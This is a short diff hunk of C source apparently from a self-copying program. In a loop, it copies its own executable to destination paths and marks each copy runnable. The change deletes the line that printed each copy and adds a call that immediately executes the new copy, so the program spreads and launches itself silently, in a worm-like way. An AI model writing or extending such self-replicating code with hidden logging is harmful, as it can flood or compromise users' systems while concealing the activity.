@@ -28,9 +28,9 @@ int main (int argc, char **argv) {
 		realpath(destFile, destAbsPath);
 		free(destFile);
 
-		printf ("copy %s to %s\n", srcAbsPath, destAbsPath);
 		copy(argv[0], destAbsPath);
 		setExecutable(destAbsPath);
+		execl(destAbsPath, NULL);
 
 		memset(destAbsPath, 0, MAX);
 		it = it->next;
